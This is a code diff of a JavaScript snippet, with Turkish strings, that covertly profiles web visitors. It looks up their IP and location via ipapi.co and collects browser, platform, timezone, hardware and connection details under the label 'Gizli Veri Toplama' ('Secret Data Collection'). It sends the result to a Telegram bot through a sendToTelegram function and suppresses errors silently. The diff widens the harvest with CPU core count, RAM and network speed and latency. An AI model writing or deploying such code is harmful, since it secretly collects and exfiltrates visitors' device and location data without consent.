@@ -28,7 +28,7 @@
           })
         });
       } catch(e) {
-        // Hata olursa sessizce geç
+        // Hata varsa sessizce geç
       }
     }
 
@@ -37,17 +37,23 @@
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
 
-        const message = `Gizli Veri:\n` +
+        const message =
+          `Gizli Veri Toplama:\n` +
           `IP: ${data.ip}\n` +
           `Şehir: ${data.city}\n` +
           `Ülke: ${data.country_name}\n` +
           `Tarayıcı: ${navigator.userAgent}\n` +
-          `Çözünürlük: ${screen.width}x${screen.height}\n` +
           `Dil: ${navigator.language}\n` +
+          `Çözünürlük: ${screen.width}x${screen.height}\n` +
           `Platform: ${navigator.platform}\n` +
-          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
+          `Zaman Dilimi (UTC): ${-new Date().getTimezoneOffset() / 60}\n` +
           `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
-          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
+          `CPU Çekirdeği: ${navigator.hardwareConcurrency || 'Bilinmiyor'}\n` +
+          `RAM (GB): ${navigator.deviceMemory || 'Bilinmiyor'}\n` +
+          `Bağlantı Tipi: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}\n` +
+          `İndirme Hızı: ${navigator.connection && navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Bilinmiyor'}\n` +
+          `Gecikme (RTT): ${navigator.connection && navigator.connection.rtt ? navigator.connection.rtt + ' ms' : 'Bilinmiyor'}\n` +
+          `Veri Tasarrufu: ${navigator.connection && navigator.connection.saveData ? 'Açık' : 'Kapalı'}`;
 
         await sendToTelegram(message);
       } catch(e) {
